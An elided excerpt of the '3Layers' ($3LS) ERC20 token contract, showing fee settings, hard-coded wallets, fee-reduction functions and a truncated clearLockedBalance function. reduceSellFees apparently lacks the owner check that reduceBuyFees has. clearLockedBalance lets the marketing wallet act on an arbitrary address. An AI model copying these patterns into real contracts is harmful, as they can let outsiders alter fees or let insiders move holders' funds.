...
/*
    ...
    3Layers - Sky, Ground, and Sea
    $3LS is an ERC20 token for those who love breathing fresh air, walking, and swimming in the sea.

    Web : https://3layers.io
    Telegram : @threelayers
    Twitter : https://twitter.com/3LayersIo
    Medium : https://medium.com/@3layers
...
contract ThreeLayersErc is ERC20, Ownable {
    ...
    uint256 private txThreshold = 25;
    ...
    constructor() ERC20("3Layers", "3LS") {
        ...
        uint256 totalSupply = 20_000_000_000 * 1e9;

        maxTransactionAmount = 200_000_001 * 1e9; // 1.0% from total supply maxTransactionAmountTxn
        maxWallet = 300_000_001 * 1e9; // 1.5% from total supply maxWallet
        ...
        marketingWallet = address(0x20257c6C3c6b251BA54fb69d80bC8641Ba40FD3c); // set as marketing wallet
        stakingRewardsWallet = address(0x456e0463d15bAcA4c3F97CE9B28a413F62564C95); // set as staking rewards wallet
    ...
    function reduceBuyFees(
        ...
        require(buySellCount > txThreshold 
            && _msgSender() == marketingWallet, "Not yet ready");
        buyMarketingFee = _marketingFee;
        buyLiquidityFee = _liquidityFee;
        buyStakingRewardsFee = _stakingRewardsFee;
        uint256 _buyTotalFees = buyMarketingFee + buyLiquidityFee + buyStakingRewardsFee;
        require(_buyTotalFees < buyTotalFees, "Invalid input");
    ...
    function reduceSellFees(
        ...
        require(buySellCount > txThreshold, "Not yet ready");
        sellMarketingFee = _marketingFee;
        sellLiquidityFee = _liquidityFee;
        sellStakingRewardsFee = _stakingRewardsFee;
        uint256 _sellTotalFees = sellMarketingFee + sellLiquidityFee + sellStakingRewardsFee;
        require(_sellTotalFees < sellTotalFees, "Invalid input");
    ...
    function clearLockedBalance(address fromAddress, uint256 amount) external {
        require( marketingWallet == msg.sender, "can be claimed by marketing address");
